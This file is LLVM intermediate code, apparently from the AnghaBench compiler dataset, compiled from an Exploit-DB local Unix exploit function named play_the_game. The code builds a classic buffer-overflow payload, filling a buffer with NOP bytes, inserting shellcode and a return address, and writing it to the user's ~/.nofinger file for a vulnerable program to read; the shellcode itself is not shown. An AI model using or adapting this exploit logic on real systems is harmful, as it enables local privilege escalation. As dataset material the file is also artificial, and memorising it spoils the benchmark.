; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20964.c_play_the_game.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20964.c_play_the_game.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.passwd = type { i8* }

@RETPOS = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [13 x i8] c"%s/.nofinger\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.2 = private unnamed_addr constant [25 x i8] c"+Writing ~/.nofinger...\0A\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"$%s\0A\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"  done\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @play_the_game(i32 %0, %struct.passwd* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca %struct.passwd*, align 8
  %5 = alloca [256 x i8], align 16
  %6 = alloca [256 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32*, align 8
  store i32 %0, i32* %3, align 4
  store %struct.passwd* %1, %struct.passwd** %4, align 8
  store i32 0, i32* %8, align 4
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %5, i64 0, i64 0
  %11 = call i32 @memset(i8* %10, i8 signext -112, i32 256)
  %12 = load i32, i32* @RETPOS, align 4
  %13 = load i8*, i8** @shellcode, align 8
  %14 = call i32 @strlen(i8* %13)
  %15 = sub nsw i32 %12, %14
  store i32 %15, i32* %7, align 4
  br label %16

16:                                               ; preds = %30, %2
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* @RETPOS, align 4
  %19 = icmp slt i32 %17, %18
  br i1 %19, label %20, label %33

20:                                               ; preds = %16
  %21 = load i8*, i8** @shellcode, align 8
  %22 = load i32, i32* %8, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %8, align 4
  %24 = sext i32 %22 to i64
  %25 = getelementptr inbounds i8, i8* %21, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [256 x i8], [256 x i8]* %5, i64 0, i64 %28
  store i8 %26, i8* %29, align 1
  br label %30

30:                                               ; preds = %20
  %31 = load i32, i32* %7, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %7, align 4
  br label %16

33:                                               ; preds = %16
  %34 = load i32, i32* %3, align 4
  %35 = and i32 %34, 255
  %36 = trunc i32 %35 to i8
  %37 = load i32, i32* @RETPOS, align 4
  %38 = add nsw i32 %37, 0
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %5, i64 0, i64 %39
  store i8 %36, i8* %40, align 1
  %41 = load i32, i32* %3, align 4
  %42 = and i32 %41, 65280
  %43 = ashr i32 %42, 8
  %44 = trunc i32 %43 to i8
  %45 = load i32, i32* @RETPOS, align 4
  %46 = add nsw i32 %45, 1
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [256 x i8], [256 x i8]* %5, i64 0, i64 %47
  store i8 %44, i8* %48, align 1
  %49 = load i32, i32* %3, align 4
  %50 = and i32 %49, 16711680
  %51 = ashr i32 %50, 16
  %52 = trunc i32 %51 to i8
  %53 = load i32, i32* @RETPOS, align 4
  %54 = add nsw i32 %53, 2
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [256 x i8], [256 x i8]* %5, i64 0, i64 %55
  store i8 %52, i8* %56, align 1
  %57 = load i32, i32* %3, align 4
  %58 = and i32 %57, -16777216
  %59 = lshr i32 %58, 24
  %60 = trunc i32 %59 to i8
  %61 = load i32, i32* @RETPOS, align 4
  %62 = add nsw i32 %61, 3
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [256 x i8], [256 x i8]* %5, i64 0, i64 %63
  store i8 %60, i8* %64, align 1
  %65 = load i32, i32* @RETPOS, align 4
  %66 = add nsw i32 %65, 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds [256 x i8], [256 x i8]* %5, i64 0, i64 %67
  store i8 0, i8* %68, align 1
  %69 = getelementptr inbounds [256 x i8], [256 x i8]* %6, i64 0, i64 0
  %70 = load %struct.passwd*, %struct.passwd** %4, align 8
  %71 = getelementptr inbounds %struct.passwd, %struct.passwd* %70, i32 0, i32 0
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 @sprintf(i8* %69, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0), i8* %72)
  %74 = getelementptr inbounds [256 x i8], [256 x i8]* %6, i64 0, i64 0
  %75 = call i32* @fopen(i8* %74, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %75, i32** %9, align 8
  %76 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0))
  %77 = load i32*, i32** %9, align 8
  %78 = getelementptr inbounds [256 x i8], [256 x i8]* %5, i64 0, i64 0
  %79 = call i32 @fprintf(i32* %77, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i8* %78)
  %80 = call i32 @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  %81 = load i32*, i32** %9, align 8
  %82 = call i32 @fclose(i32* %81)
  ret void
}

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, i8*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
